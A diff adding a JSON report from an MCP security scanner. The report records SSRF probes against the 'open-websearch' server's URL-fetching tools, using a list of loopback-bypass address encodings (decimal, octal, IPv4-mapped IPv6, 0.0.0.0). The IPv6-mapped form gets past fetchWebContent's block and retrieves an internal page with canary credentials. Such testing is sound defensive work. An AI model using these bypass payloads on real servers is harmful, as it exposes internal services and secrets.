@@ -1,0 +1,1232 @@
+{
+  "tool": "real-target-check",
+  "version": "3.1.0",
+  "started_at": "2026-10-20T16:30:20.180610+00:00",
+  "target": {
+    "transport": "stdio",
+    "base_url": null,
+    "mcp_path": null,
+    "tls_ca": null,
+    "command": [
+      "C:\\Program Files\\nodejs\\node.EXE",
+      "C:/Users/ML/AppData/Local/npm-cache/_npx/0e573230af4e6df9/node_modules/open-websearch/build/index.js"
+    ],
+    "profile": "black-box"
+  },
+  "findings": {
+    "P1-fingerprint": {
+      "status": "info",
+      "proof": "era=legacy transport=stdio",
+      "details": {
+        "transport": "stdio",
+        "era": "legacy",
+        "discover_error": "risposta non-discover: {'jsonrpc': '2.0', 'id': 1, 'error': {'code': -32601, 'message': 'Method not found'}}",
+        "initialize": {
+          "protocolVersion": "2025-11-25",
+          "capabilities": {
+            "tools": {
+              "listChanged": true
+            }
+          },
+          "serverInfo": {
+            "name": "web-search",
+            "version": "1.2.0"
+          }
+        }
+      }
+    },
+    "P2-tool-poisoning": {
+      "status": "skipped",
+      "proof": "fuori selezione --probes",
+      "details": {}
+    },
+    "P9-behavioral": {
+      "status": "skipped",
+      "proof": "fuori selezione --probes",
+      "details": {}
+    },
+    "P10-influence": {
+      "status": "skipped",
+      "proof": "fuori selezione --probes",
+      "details": {}
+    },
+    "P11-token-shape": {
+      "status": "skipped",
+      "proof": "fuori selezione --probes",
+      "details": {}
+    },
+    "P3-resource-traversal": {
+      "status": "skipped",
+      "proof": "fuori selezione --probes",
+      "details": {}
+    },
+    "P15-resource-content": {
+      "status": "skipped",
+      "proof": "fuori selezione --probes",
+      "details": {}
+    },
+    "P4-arg-injection": {
+      "status": "skipped",
+      "proof": "fuori selezione --probes",
+      "details": {}
+    },
+    "P5-tool-traversal": {
+      "status": "skipped",
+      "proof": "fuori selezione --probes",
+      "details": {}
+    },
+    "P6-ssrf-collaborator": {
+      "status": "vulnerable",
+      "proof": "SSRF interna dimostrata: token tornato via ['fetchWebContent.url=http://[::ffff:127.0.0.1]:64677/internal/ops']",
+      "details": {
+        "hits": [
+          "fetchWebContent.url=http://[::ffff:127.0.0.1]:64677/internal/ops"
+        ],
+        "tried": 21,
+        "blocked": 0,
+        "swept": 4,
+        "url_args": 5,
+        "planned": 5,
+        "host_args": 0,
+        "responses": 1,
+        "policy_rejections": 20,
+        "unresolved_errors": 0,
+        "error_samples": [],
+        "max_attempts": 60,
+        "complete": false
+      }
+    },
+    "P8-sqli": {
+      "status": "skipped",
+      "proof": "fuori selezione --probes",
+      "details": {}
+    }
+  },
+  "transcript": [
+    {
+      "direction": "->",
+      "at": 1792513820.193025,
+      "payload": {
+        "stdio": [
+          "C:\\Program Files\\nodejs\\node.EXE",
+          "C:/Users/ML/AppData/Local/npm-cache/_npx/0e573230af4e6df9/node_modules/open-websearch/build/index.js"
+        ],
+        "body": {
+          "jsonrpc": "2.0",
+          "id": 1,
+          "method": "server/discover",
+          "params": {
+            "_meta": {
+              "io.modelcontextprotocol/protocolVersion": "2026-07-28",
+              "io.modelcontextprotocol/clientInfo": {
+                "name": "mcp-vulnlab-real-target",
+                "version": "3.0.0"
+              }
+            }
+          }
+        }
+      }
+    },
+    {
+      "direction": "<-",
+      "at": 1792513821.5672972,
+      "payload": {
+        "jsonrpc": "2.0",
+        "id": 1,
+        "error": {
+          "code": -32601,
+          "message": "Method not found"
+        }
+      }
+    },
+    {
+      "direction": "->",
+      "at": 1792513821.5673769,
+      "payload": {
+        "stdio": [
+          "C:\\Program Files\\nodejs\\node.EXE",
+          "C:/Users/ML/AppData/Local/npm-cache/_npx/0e573230af4e6df9/node_modules/open-websearch/build/index.js"
+        ],
+        "body": {
+          "jsonrpc": "2.0",
+          "id": 2,
+          "method": "initialize",
+          "params": {
+            "protocolVersion": "2025-11-25",
+            "capabilities": {},
+            "clientInfo": {
+              "name": "mcp-vulnlab-real-target",
+              "version": "3.0.0"
+            }
+          }
+        }
+      }
+    },
+    {
+      "direction": "<-",
+      "at": 1792513821.5693405,
+      "payload": {
+        "result": {
+          "protocolVersion": "2025-11-25",
+          "capabilities": {
+            "tools": {
+              "listChanged": true
+            }
+          },
+          "serverInfo": {
+            "name": "web-search",
+            "version": "1.2.0"
+          }
+        },
+        "jsonrpc": "2.0",
+        "id": 2
+      }
+    },
+    {
+      "direction": "->",
+      "at": 1792513821.5693562,
+      "payload": {
+        "stdio": [
+          "C:\\Program Files\\nodejs\\node.EXE",
+          "C:/Users/ML/AppData/Local/npm-cache/_npx/0e573230af4e6df9/node_modules/open-websearch/build/index.js"
+        ],
+        "body": {
+          "jsonrpc": "2.0",
+          "method": "notifications/initialized"
+        }
+      }
+    },
+    {
+      "direction": "->",
+      "at": 1792513821.5732996,
+      "payload": {
+        "stdio": [
+          "C:\\Program Files\\nodejs\\node.EXE",
+          "C:/Users/ML/AppData/Local/npm-cache/_npx/0e573230af4e6df9/node_modules/open-websearch/build/index.js"
+        ],
+        "body": {
+          "jsonrpc": "2.0",
+          "id": 3,
+          "method": "initialize",
+          "params": {
+            "protocolVersion": "2025-11-25",
+            "capabilities": {},
+            "clientInfo": {
+              "name": "mcp-vulnlab-real-target",
+              "version": "3.0.0"
+            }
+          }
+        }
+      }
+    },
+    {
+      "direction": "<-",
+      "at": 1792513821.5740497,
+      "payload": {
+        "result": {
+          "protocolVersion": "2025-11-25",
+          "capabilities": {
+            "tools": {
+              "listChanged": true
+            }
+          },
+          "serverInfo": {
+            "name": "web-search",
+            "version": "1.2.0"
+          }
+        },
+        "jsonrpc": "2.0",
+        "id": 3
+      }
+    },
+    {
+      "direction": "->",
+      "at": 1792513821.5740821,
+      "payload": {
+        "stdio": [
+          "C:\\Program Files\\nodejs\\node.EXE",
+          "C:/Users/ML/AppData/Local/npm-cache/_npx/0e573230af4e6df9/node_modules/open-websearch/build/index.js"
+        ],
+        "body": {
+          "jsonrpc": "2.0",
+          "id": 4,
+          "method": "tools/list",
+          "params": {}
+        }
+      }
+    },
+    {
+      "direction": "<-",
+      "at": 1792513821.5780005,
+      "payload": {
+        "result": {
+          "tools": [
+            {
+              "name": "search",
+              "description": "Search the web using multiple engines (e.g., Baidu, Bing, DuckDuckGo, CSDN, Exa, Brave, Juejin(掘金), Startpage) with no API key required",
+              "inputSchema": {
+                "type": "object",
+                "properties": {
+                  "query": {
+                    "type": "string",
+                    "minLength": 1
+                  },
+                  "limit": {
+                    "type": "number",
+                    "minimum": 1,
+                    "maximum": 50,
+                    "default": 10
+                  },
+                  "searchMode": {
+                    "type": "string",
+                    "enum": [
+                      "request",
+                      "auto",
+                      "playwright"
+                    ]
+                  },
+                  "engines": {
+                    "type": "array",
+                    "items": {
+                      "type": "string",
+                      "minLength": 1
+                    },
+                    "minItems": 1,
+                    "default": [
+                      "bing"
+                    ]
+                  }
+                },
+                "required": [
+                  "query"
+                ],
+                "additionalProperties": false,
+                "$schema": "http://json-schema.org/draft-07/schema#"
+              },
+              "execution": {
+                "taskSupport": "forbidden"
+              }
+            },
+            {
+              "name": "fetchLinuxDoArticle",
+              "description": "Fetch full article content from a linux.do post URL",
+              "inputSchema": {
+                "type": "object",
+                "properties": {
+                  "url": {
+                    "type": "string",
+                    "format": "uri"
+                  }
+                },
+                "required": [
+                  "url"
+                ],
+                "additionalProperties": false,
+                "$schema": "http://json-schema.org/draft-07/schema#"
+              },
+              "execution": {
+                "taskSupport": "forbidden"
+              }
+            },
+            {
+              "name": "fetchCsdnArticle",
+              "description": "Fetch full article content from a csdn post URL",
+              "inputSchema": {
+                "type": "object",
+                "properties": {
+                  "url": {
+                    "type": "string",
+                    "format": "uri"
+                  }
+                },
+                "required": [
+                  "url"
+                ],
+                "additionalProperties": false,
+                "$schema": "http://json-schema.org/draft-07/schema#"
+              },
+              "execution": {
+                "taskSupport": "forbidden"
+              }
+            },
+            {
+              "name": "fetchGithubReadme",
+              "description": "Fetch README content from a GitHub repository URL",
+              "inputSchema": {
+                "type": "object",
+                "properties": {
+                  "url": {
+                    "type": "string",
+                    "minLength": 1
+                  }
+                },
+                "required": [
+                  "url"
+                ],
+                "additionalProperties": false,
+                "$schema": "http://json-schema.org/draft-07/schema#"
+              },
+              "execution": {
+                "taskSupport": "forbidden"
+              }
+            },
+            {
+              "name": "fetchWebContent",
+              "description": "Fetch content from a public HTTP(S) URL (supports Markdown files and normal web pages)",
+              "inputSchema": {
+                "type": "object",
+                "properties": {
+                  "url": {
+                    "type": "string",
+                    "format": "uri"
+                  },
+                  "maxChars": {
+                    "type": "integer",
+                    "minimum": 1000,
+                    "maximum": 200000,
+                    "default": 30000
+                  },
+                  "readability": {
+                    "type": "boolean"
+                  },
+                  "includeLinks": {
+                    "type": "boolean"
+                  }
+                },
+                "required": [
+                  "url"
+                ],
+                "additionalProperties": false,
+                "$schema": "http://json-schema.org/draft-07/schema#"
+              },
+              "execution": {
+                "taskSupport": "forbidden"
+              }
+            },
+            {
+              "name": "fetchJuejinArticle",
+              "description": "Fetch full article content from a Juejin(掘金) post URL",
+              "inputSchema": {
+                "type": "object",
+                "properties": {
+                  "url": {
+                    "type": "string",
+                    "format": "uri"
+                  }
+                },
+                "required": [
+                  "url"
+                ],
+                "additionalProperties": false,
+                "$schema": "http://json-schema.org/draft-07/schema#"
+              },
+              "execution": {
+                "taskSupport": "forbidden"
+              }
+            }
+          ]
+        },
+        "jsonrpc": "2.0",
+        "id": 4
+      }
+    },
+    {
+      "direction": "->",
+      "at": 1792513821.5983417,
+      "payload": {
+        "stdio": [
+          "C:\\Program Files\\nodejs\\node.EXE",
+          "C:/Users/ML/AppData/Local/npm-cache/_npx/0e573230af4e6df9/node_modules/open-websearch/build/index.js"
+        ],
+        "body": {
+          "jsonrpc": "2.0",
+          "id": 5,
+          "method": "tools/call",
+          "params": {
+            "name": "fetchLinuxDoArticle",
+            "arguments": {
+              "url": "http://127.0.0.1:64677/internal/ops"
+            }
+          }
+        }
+      }
+    },
+    {
+      "direction": "<-",
+      "at": 1792513821.6014893,
+      "payload": {
+        "result": {
+          "content": [
+            {
+              "type": "text",
+              "text": "MCP error -32602: Input validation error: Invalid arguments for tool fetchLinuxDoArticle: URL must be from linux.do and end with .json at url"
+            }
+          ],
+          "isError": true
+        },
+        "jsonrpc": "2.0",
+        "id": 5
+      }
+    },
+    {
+      "direction": "->",
+      "at": 1792513821.6025057,
+      "payload": {
+        "stdio": [
+          "C:\\Program Files\\nodejs\\node.EXE",
+          "C:/Users/ML/AppData/Local/npm-cache/_npx/0e573230af4e6df9/node_modules/open-websearch/build/index.js"
+        ],
+        "body": {
+          "jsonrpc": "2.0",
+          "id": 6,
+          "method": "tools/call",
+          "params": {
+            "name": "fetchLinuxDoArticle",
+            "arguments": {
+              "url": "http://localhost:64677/internal/ops"
+            }
+          }
+        }
+      }
+    },
+    {
+      "direction": "<-",
+      "at": 1792513821.6031268,
+      "payload": {
+        "result": {
+          "content": [
+            {
+              "type": "text",
+              "text": "MCP error -32602: Input validation error: Invalid arguments for tool fetchLinuxDoArticle: URL must be from linux.do and end with .json at url"
+            }
+          ],
+          "isError": true
+        },
+        "jsonrpc": "2.0",
+        "id": 6
+      }
+    },
+    {
+      "direction": "->",
+      "at": 1792513821.6031969,
+      "payload": {
+        "stdio": [
+          "C:\\Program Files\\nodejs\\node.EXE",
+          "C:/Users/ML/AppData/Local/npm-cache/_npx/0e573230af4e6df9/node_modules/open-websearch/build/index.js"
+        ],
+        "body": {
+          "jsonrpc": "2.0",
+          "id": 7,
+          "method": "tools/call",
+          "params": {
+            "name": "fetchLinuxDoArticle",
+            "arguments": {
+              "url": "http://[::ffff:127.0.0.1]:64677/internal/ops"
+            }
+          }
+        }
+      }
+    },
+    {
+      "direction": "<-",
+      "at": 1792513821.6041687,
+      "payload": {
+        "result": {
+          "content": [
+            {
+              "type": "text",
+              "text": "MCP error -32602: Input validation error: Invalid arguments for tool fetchLinuxDoArticle: URL must be from linux.do and end with .json at url"
+            }
+          ],
+          "isError": true
+        },
+        "jsonrpc": "2.0",
+        "id": 7
+      }
+    },
+    {
+      "direction": "->",
+      "at": 1792513821.604225,
+      "payload": {
+        "stdio": [
+          "C:\\Program Files\\nodejs\\node.EXE",
+          "C:/Users/ML/AppData/Local/npm-cache/_npx/0e573230af4e6df9/node_modules/open-websearch/build/index.js"
+        ],
+        "body": {
+          "jsonrpc": "2.0",
+          "id": 8,
+          "method": "tools/call",
+          "params": {
+            "name": "fetchLinuxDoArticle",
+            "arguments": {
+              "url": "http://2130706433:64677/internal/ops"
+            }
+          }
+        }
+      }
+    },
+    {
+      "direction": "<-",
+      "at": 1792513821.6049738,
+      "payload": {
+        "result": {
+          "content": [
+            {
+              "type": "text",
+              "text": "MCP error -32602: Input validation error: Invalid arguments for tool fetchLinuxDoArticle: URL must be from linux.do and end with .json at url"
+            }
+          ],
+          "isError": true
+        },
+        "jsonrpc": "2.0",
+        "id": 8
+      }
+    },
+    {
+      "direction": "->",
+      "at": 1792513821.605081,
+      "payload": {
+        "stdio": [
+          "C:\\Program Files\\nodejs\\node.EXE",
+          "C:/Users/ML/AppData/Local/npm-cache/_npx/0e573230af4e6df9/node_modules/open-websearch/build/index.js"
+        ],
+        "body": {
+          "jsonrpc": "2.0",
+          "id": 9,
+          "method": "tools/call",
+          "params": {
+            "name": "fetchLinuxDoArticle",
+            "arguments": {
+              "url": "http://0177.0.0.1:64677/internal/ops"
+            }
+          }
+        }
+      }
+    },
+    {
+      "direction": "<-",
+      "at": 1792513821.6057718,
+      "payload": {
+        "result": {
+          "content": [
+            {
+              "type": "text",
+              "text": "MCP error -32602: Input validation error: Invalid arguments for tool fetchLinuxDoArticle: URL must be from linux.do and end with .json at url"
+            }
+          ],
+          "isError": true
+        },
+        "jsonrpc": "2.0",
+        "id": 9
+      }
+    },
+    {
+      "direction": "->",
+      "at": 1792513821.6058438,
+      "payload": {
+        "stdio": [
+          "C:\\Program Files\\nodejs\\node.EXE",
+          "C:/Users/ML/AppData/Local/npm-cache/_npx/0e573230af4e6df9/node_modules/open-websearch/build/index.js"
+        ],
+        "body": {
+          "jsonrpc": "2.0",
+          "id": 10,
+          "method": "tools/call",
+          "params": {
+            "name": "fetchLinuxDoArticle",
+            "arguments": {
+              "url": "http://0.0.0.0:64677/internal/ops"
+            }
+          }
+        }
+      }
+    },
+    {
+      "direction": "<-",
+      "at": 1792513821.606474,
+      "payload": {
+        "result": {
+          "content": [
+            {
+              "type": "text",
+              "text": "MCP error -32602: Input validation error: Invalid arguments for tool fetchLinuxDoArticle: URL must be from linux.do and end with .json at url"
+            }
+          ],
+          "isError": true
+        },
+        "jsonrpc": "2.0",
+        "id": 10
+      }
+    },
+    {
+      "direction": "->",
+      "at": 1792513821.6065402,
+      "payload": {
+        "stdio": [
+          "C:\\Program Files\\nodejs\\node.EXE",
+          "C:/Users/ML/AppData/Local/npm-cache/_npx/0e573230af4e6df9/node_modules/open-websearch/build/index.js"
+        ],
+        "body": {
+          "jsonrpc": "2.0",
+          "id": 11,
+          "method": "tools/call",
+          "params": {
+            "name": "fetchCsdnArticle",
+            "arguments": {
+              "url": "http://127.0.0.1:64677/internal/ops"
+            }
+          }
+        }
+      }
+    },
+    {
+      "direction": "<-",
+      "at": 1792513821.6071146,
+      "payload": {
+        "result": {
+          "content": [
+            {
+              "type": "text",
+              "text": "MCP error -32602: Input validation error: Invalid arguments for tool fetchCsdnArticle: URL must be from blog.csdn.net contains /article/details/ path at url"
+            }
+          ],
+          "isError": true
+        },
+        "jsonrpc": "2.0",
+        "id": 11
+      }
+    },
+    {
+      "direction": "->",
+      "at": 1792513821.6071885,
+      "payload": {
+        "stdio": [
+          "C:\\Program Files\\nodejs\\node.EXE",
+          "C:/Users/ML/AppData/Local/npm-cache/_npx/0e573230af4e6df9/node_modules/open-websearch/build/index.js"
+        ],
+        "body": {
+          "jsonrpc": "2.0",
+          "id": 12,
+          "method": "tools/call",
+          "params": {
+            "name": "fetchCsdnArticle",
+            "arguments": {
+              "url": "http://localhost:64677/internal/ops"
+            }
+          }
+        }
+      }
+    },
+    {
+      "direction": "<-",
+      "at": 1792513821.6076891,
+      "payload": {
+        "result": {
+          "content": [
+            {
+              "type": "text",
+              "text": "MCP error -32602: Input validation error: Invalid arguments for tool fetchCsdnArticle: URL must be from blog.csdn.net contains /article/details/ path at url"
+            }
+          ],
+          "isError": true
+        },
+        "jsonrpc": "2.0",
+        "id": 12
+      }
+    },
+    {
+      "direction": "->",
+      "at": 1792513821.6078215,
+      "payload": {
+        "stdio": [
+          "C:\\Program Files\\nodejs\\node.EXE",
+          "C:/Users/ML/AppData/Local/npm-cache/_npx/0e573230af4e6df9/node_modules/open-websearch/build/index.js"
+        ],
+        "body": {
+          "jsonrpc": "2.0",
+          "id": 13,
+          "method": "tools/call",
+          "params": {
+            "name": "fetchCsdnArticle",
+            "arguments": {
+              "url": "http://[::ffff:127.0.0.1]:64677/internal/ops"
+            }
+          }
+        }
+      }
+    },
+    {
+      "direction": "<-",
+      "at": 1792513821.608388,
+      "payload": {
+        "result": {
+          "content": [
+            {
+              "type": "text",
+              "text": "MCP error -32602: Input validation error: Invalid arguments for tool fetchCsdnArticle: URL must be from blog.csdn.net contains /article/details/ path at url"
+            }
+          ],
+          "isError": true
+        },
+        "jsonrpc": "2.0",
+        "id": 13
+      }
+    },
+    {
+      "direction": "->",
+      "at": 1792513821.6084936,
+      "payload": {
+        "stdio": [
+          "C:\\Program Files\\nodejs\\node.EXE",
+          "C:/Users/ML/AppData/Local/npm-cache/_npx/0e573230af4e6df9/node_modules/open-websearch/build/index.js"
+        ],
+        "body": {
+          "jsonrpc": "2.0",
+          "id": 14,
+          "method": "tools/call",
+          "params": {
+            "name": "fetchCsdnArticle",
+            "arguments": {
+              "url": "http://2130706433:64677/internal/ops"
+            }
+          }
+        }
+      }
+    },
+    {
+      "direction": "<-",
+      "at": 1792513821.6090367,
+      "payload": {
+        "result": {
+          "content": [
+            {
+              "type": "text",
+              "text": "MCP error -32602: Input validation error: Invalid arguments for tool fetchCsdnArticle: URL must be from blog.csdn.net contains /article/details/ path at url"
+            }
+          ],
+          "isError": true
+        },
+        "jsonrpc": "2.0",
+        "id": 14
+      }
+    },
+    {
+      "direction": "->",
+      "at": 1792513821.6091423,
+      "payload": {
+        "stdio": [
+          "C:\\Program Files\\nodejs\\node.EXE",
+          "C:/Users/ML/AppData/Local/npm-cache/_npx/0e573230af4e6df9/node_modules/open-websearch/build/index.js"
+        ],
+        "body": {
+          "jsonrpc": "2.0",
+          "id": 15,
+          "method": "tools/call",
+          "params": {
+            "name": "fetchCsdnArticle",
+            "arguments": {
+              "url": "http://0177.0.0.1:64677/internal/ops"
+            }
+          }
+        }
+      }
+    },
+    {
+      "direction": "<-",
+      "at": 1792513821.6096046,
+      "payload": {
+        "result": {
+          "content": [
+            {
+              "type": "text",
+              "text": "MCP error -32602: Input validation error: Invalid arguments for tool fetchCsdnArticle: URL must be from blog.csdn.net contains /article/details/ path at url"
+            }
+          ],
+          "isError": true
+        },
+        "jsonrpc": "2.0",
+        "id": 15
+      }
+    },
+    {
+      "direction": "->",
+      "at": 1792513821.6097062,
+      "payload": {
+        "stdio": [
+          "C:\\Program Files\\nodejs\\node.EXE",
+          "C:/Users/ML/AppData/Local/npm-cache/_npx/0e573230af4e6df9/node_modules/open-websearch/build/index.js"
+        ],
+        "body": {
+          "jsonrpc": "2.0",
+          "id": 16,
+          "method": "tools/call",
+          "params": {
+            "name": "fetchCsdnArticle",
+            "arguments": {
+              "url": "http://0.0.0.0:64677/internal/ops"
+            }
+          }
+        }
+      }
+    },
+    {
+      "direction": "<-",
+      "at": 1792513821.6100736,
+      "payload": {
+        "result": {
+          "content": [
+            {
+              "type": "text",
+              "text": "MCP error -32602: Input validation error: Invalid arguments for tool fetchCsdnArticle: URL must be from blog.csdn.net contains /article/details/ path at url"
+            }
+          ],
+          "isError": true
+        },
+        "jsonrpc": "2.0",
+        "id": 16
+      }
+    },
+    {
+      "direction": "->",
+      "at": 1792513821.6101258,
+      "payload": {
+        "stdio": [
+          "C:\\Program Files\\nodejs\\node.EXE",
+          "C:/Users/ML/AppData/Local/npm-cache/_npx/0e573230af4e6df9/node_modules/open-websearch/build/index.js"
+        ],
+        "body": {
+          "jsonrpc": "2.0",
+          "id": 17,
+          "method": "tools/call",
+          "params": {
+            "name": "fetchGithubReadme",
+            "arguments": {
+              "url": "http://127.0.0.1:64677/internal/ops"
+            }
+          }
+        }
+      }
+    },
+    {
+      "direction": "<-",
+      "at": 1792513821.6106415,
+      "payload": {
+        "result": {
+          "content": [
+            {
+              "type": "text",
+              "text": "MCP error -32602: Input validation error: Invalid arguments for tool fetchGithubReadme: URL must be a valid GitHub repository URL (supports HTTPS, SSH formats) at url"
+            }
+          ],
+          "isError": true
+        },
+        "jsonrpc": "2.0",
+        "id": 17
+      }
+    },
+    {
+      "direction": "->",
+      "at": 1792513821.6108105,
+      "payload": {
+        "stdio": [
+          "C:\\Program Files\\nodejs\\node.EXE",
+          "C:/Users/ML/AppData/Local/npm-cache/_npx/0e573230af4e6df9/node_modules/open-websearch/build/index.js"
+        ],
+        "body": {
+          "jsonrpc": "2.0",
+          "id": 18,
+          "method": "tools/call",
+          "params": {
+            "name": "fetchGithubReadme",
+            "arguments": {
+              "url": "http://localhost:64677/internal/ops"
+            }
+          }
+        }
+      }
+    },
+    {
+      "direction": "<-",
+      "at": 1792513821.6113124,
+      "payload": {
+        "result": {
+          "content": [
+            {
+              "type": "text",
+              "text": "MCP error -32602: Input validation error: Invalid arguments for tool fetchGithubReadme: URL must be a valid GitHub repository URL (supports HTTPS, SSH formats) at url"
+            }
+          ],
+          "isError": true
+        },
+        "jsonrpc": "2.0",
+        "id": 18
+      }
+    },
+    {
+      "direction": "->",
+      "at": 1792513821.6113694,
+      "payload": {
+        "stdio": [
+          "C:\\Program Files\\nodejs\\node.EXE",
+          "C:/Users/ML/AppData/Local/npm-cache/_npx/0e573230af4e6df9/node_modules/open-websearch/build/index.js"
+        ],
+        "body": {
+          "jsonrpc": "2.0",
+          "id": 19,
+          "method": "tools/call",
+          "params": {
+            "name": "fetchGithubReadme",
+            "arguments": {
+              "url": "http://[::ffff:127.0.0.1]:64677/internal/ops"
+            }
+          }
+        }
+      }
+    },
+    {
+      "direction": "<-",
+      "at": 1792513821.611758,
+      "payload": {
+        "result": {
+          "content": [
+            {
+              "type": "text",
+              "text": "MCP error -32602: Input validation error: Invalid arguments for tool fetchGithubReadme: URL must be a valid GitHub repository URL (supports HTTPS, SSH formats) at url"
+            }
+          ],
+          "isError": true
+        },
+        "jsonrpc": "2.0",
+        "id": 19
+      }
+    },
+    {
+      "direction": "->",
+      "at": 1792513821.6118128,
+      "payload": {
+        "stdio": [
+          "C:\\Program Files\\nodejs\\node.EXE",
+          "C:/Users/ML/AppData/Local/npm-cache/_npx/0e573230af4e6df9/node_modules/open-websearch/build/index.js"
+        ],
+        "body": {
+          "jsonrpc": "2.0",
+          "id": 20,
+          "method": "tools/call",
+          "params": {
+            "name": "fetchGithubReadme",
+            "arguments": {
+              "url": "http://2130706433:64677/internal/ops"
+            }
+          }
+        }
+      }
+    },
+    {
+      "direction": "<-",
+      "at": 1792513821.612155,
+      "payload": {
+        "result": {
+          "content": [
+            {
+              "type": "text",
+              "text": "MCP error -32602: Input validation error: Invalid arguments for tool fetchGithubReadme: URL must be a valid GitHub repository URL (supports HTTPS, SSH formats) at url"
+            }
+          ],
+          "isError": true
+        },
+        "jsonrpc": "2.0",
+        "id": 20
+      }
+    },
+    {
+      "direction": "->",
+      "at": 1792513821.6122067,
+      "payload": {
+        "stdio": [
+          "C:\\Program Files\\nodejs\\node.EXE",
+          "C:/Users/ML/AppData/Local/npm-cache/_npx/0e573230af4e6df9/node_modules/open-websearch/build/index.js"
+        ],
+        "body": {
+          "jsonrpc": "2.0",
+          "id": 21,
+          "method": "tools/call",
+          "params": {
+            "name": "fetchGithubReadme",
+            "arguments": {
+              "url": "http://0177.0.0.1:64677/internal/ops"
+            }
+          }
+        }
+      }
+    },
+    {
+      "direction": "<-",
+      "at": 1792513821.61254,
+      "payload": {
+        "result": {
+          "content": [
+            {
+              "type": "text",
+              "text": "MCP error -32602: Input validation error: Invalid arguments for tool fetchGithubReadme: URL must be a valid GitHub repository URL (supports HTTPS, SSH formats) at url"
+            }
+          ],
+          "isError": true
+        },
+        "jsonrpc": "2.0",
+        "id": 21
+      }
+    },
+    {
+      "direction": "->",
+      "at": 1792513821.6125913,
+      "payload": {
+        "stdio": [
+          "C:\\Program Files\\nodejs\\node.EXE",
+          "C:/Users/ML/AppData/Local/npm-cache/_npx/0e573230af4e6df9/node_modules/open-websearch/build/index.js"
+        ],
+        "body": {
+          "jsonrpc": "2.0",
+          "id": 22,
+          "method": "tools/call",
+          "params": {
+            "name": "fetchGithubReadme",
+            "arguments": {
+              "url": "http://0.0.0.0:64677/internal/ops"
+            }
+          }
+        }
+      }
+    },
+    {
+      "direction": "<-",
+      "at": 1792513821.6129763,
+      "payload": {
+        "result": {
+          "content": [
+            {
+              "type": "text",
+              "text": "MCP error -32602: Input validation error: Invalid arguments for tool fetchGithubReadme: URL must be a valid GitHub repository URL (supports HTTPS, SSH formats) at url"
+            }
+          ],
+          "isError": true
+        },
+        "jsonrpc": "2.0",
+        "id": 22
+      }
+    },
+    {
+      "direction": "->",
+      "at": 1792513821.6130354,
+      "payload": {
+        "stdio": [
+          "C:\\Program Files\\nodejs\\node.EXE",
+          "C:/Users/ML/AppData/Local/npm-cache/_npx/0e573230af4e6df9/node_modules/open-websearch/build/index.js"
+        ],
+        "body": {
+          "jsonrpc": "2.0",
+          "id": 23,
+          "method": "tools/call",
+          "params": {
+            "name": "fetchWebContent",
+            "arguments": {
+              "url": "http://127.0.0.1:64677/internal/ops"
+            }
+          }
+        }
+      }
+    },
+    {
+      "direction": "<-",
+      "at": 1792513821.61396,
+      "payload": {
+        "result": {
+          "content": [
+            {
+              "type": "text",
+              "text": "MCP error -32602: Input validation error: Invalid arguments for tool fetchWebContent: URL must be a public HTTP(S) address (private/local network targets are blocked) at url"
+            }
+          ],
+          "isError": true
+        },
+        "jsonrpc": "2.0",
+        "id": 23
+      }
+    },
+    {
+      "direction": "->",
+      "at": 1792513821.6140087,
+      "payload": {
+        "stdio": [
+          "C:\\Program Files\\nodejs\\node.EXE",
+          "C:/Users/ML/AppData/Local/npm-cache/_npx/0e573230af4e6df9/node_modules/open-websearch/build/index.js"
+        ],
+        "body": {
+          "jsonrpc": "2.0",
+          "id": 24,
+          "method": "tools/call",
+          "params": {
+            "name": "fetchWebContent",
+            "arguments": {
+              "url": "http://localhost:64677/internal/ops"
+            }
+          }
+        }
+      }
+    },
+    {
+      "direction": "<-",
+      "at": 1792513821.614525,
+      "payload": {
+        "result": {
+          "content": [
+            {
+              "type": "text",
+              "text": "MCP error -32602: Input validation error: Invalid arguments for tool fetchWebContent: URL must be a public HTTP(S) address (private/local network targets are blocked) at url"
+            }
+          ],
+          "isError": true
+        },
+        "jsonrpc": "2.0",
+        "id": 24
+      }
+    },
+    {
+      "direction": "->",
+      "at": 1792513821.6145716,
+      "payload": {
+        "stdio": [
+          "C:\\Program Files\\nodejs\\node.EXE",
+          "C:/Users/ML/AppData/Local/npm-cache/_npx/0e573230af4e6df9/node_modules/open-websearch/build/index.js"
+        ],
+        "body": {
+          "jsonrpc": "2.0",
+          "id": 25,
+          "method": "tools/call",
+          "params": {
+            "name": "fetchWebContent",
+            "arguments": {
+              "url": "http://[::ffff:127.0.0.1]:64677/internal/ops"
+            }
+          }
+        }
+      }
+    },
+    {
+      "direction": "<-",
+      "at": 1792513821.640449,
+      "payload": {
+        "result": {
+          "content": [
+            {
+              "type": "text",
+              "text": "{\n  \"url\": \"http://[::ffff:7f00:1]:64677/internal/ops\",\n  \"finalUrl\": \"http://[::ffff:7f00:1]:64677/internal/ops\",\n  \"contentType\": \"text/html\",\n  \"title\": \"Internal Ops Console\",\n  \"retrievalMethod\": \"request\",\n  \"truncated\": false,\n  \"content\": \"INTERNAL OPS CONSOLE - restrictedSession token=FIXTURE_CANARY_SSRF_e18aa430Service account: ops-svc, api_key=sk-internal-e18aa430Record #1000: ubiquity node 0, quota 512GB. Contact ops@example.internal.Record #1001: ubiquity node 1, quota 1024GB. Contact ops@example.internal.Record #1002: ubiquity node 2, quota 1536GB. Contact ops@example.internal.Record #1003: ubiquity node 3, quota 2048GB. Contact ops@example.internal.Record #1004: ubiquity node 4, quota 2560GB. Contact ops@example.internal.Record #1005: ubiquity node 5, quota 3072GB. Contact ops@example.internal.Record #1006: ubiquity node 6, quota 3584GB. Contact ops@example.internal.Record #1007: ubiquity node 7, quota 4096GB. Contact ops@example.internal.Record #1008: ubiquity node 8, quota 4608GB. Contact ops@example.internal.Record #1009: ubiquity node 9, quota 5120GB. Contact ops@example.internal.Record #1010: ubiquity node 10, quota 5632GB. Contact ops@example.internal.Record #1011: ubiquity node 11, quota 6144GB. Contact ops@example.internal.End of report. internal-ops v3.1.0.\"\n}"
+            }
+          ]
+        },
+        "jsonrpc": "2.0",
+        "id": 25
+      }
+    }
+  ],
+  "recon": {}
+}
